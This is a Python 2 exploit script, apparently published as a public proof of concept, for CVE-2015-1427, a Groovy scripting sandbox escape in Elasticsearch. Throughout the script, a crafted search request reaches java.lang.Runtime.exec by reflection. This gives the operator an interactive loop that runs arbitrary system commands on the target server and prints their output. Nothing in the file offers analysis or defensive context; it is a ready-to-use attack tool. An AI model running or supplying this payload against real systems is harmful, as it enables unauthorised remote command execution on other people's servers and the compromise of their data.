#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Elasticsearch groovy RCE exp(CVE-2015-1427)
__author__ = '@S4kur4'

import urllib
import urllib2
import json
import sys
import optparse

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def main():
    command = ""
    parser = optparse.OptionParser('Usage: %prog [options]\nExample: %prog -u http://www.test.com:9200/_search?pretty')
    parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
    (options, args) = parser.parse_args()
    if options.target_url==None:
        parser.print_help()
        sys.exit(0)
    else:
        target_url = options.target_url
    target_url = target_url.rstrip('/')
    command = raw_input("\033[1;34m[*]\033[0m Input system command to execute or print 'q' to exit.\n\033[4mCommand\033[0m > ")
    while command != "q":
        data = """{"size":1,"script_fields": {"iswin": {"script":"java.lang.Math.class.forName(\\"java.io.BufferedReader\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\"java.io.InputStreamReader\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\\""""+command+"""\\").getInputStream())).readLines()","lang": "groovy"}}}"""
        try:
            request = urllib2.Request(url=target_url, data=data, headers=header)
            response = urllib2.urlopen(request)
            response_json = json.loads(response.read())
            for i in response_json["hits"]["hits"][0]["fields"]["iswin"][0]:
            	print i
        except Exception, e:
            print "\033[1;31m[-]\033[0m Failed, maybe the site is not vulnerable."
            break
        command = raw_input("\n\033[4mCommand\033[0m > ")

if __name__ == '__main__':
    main()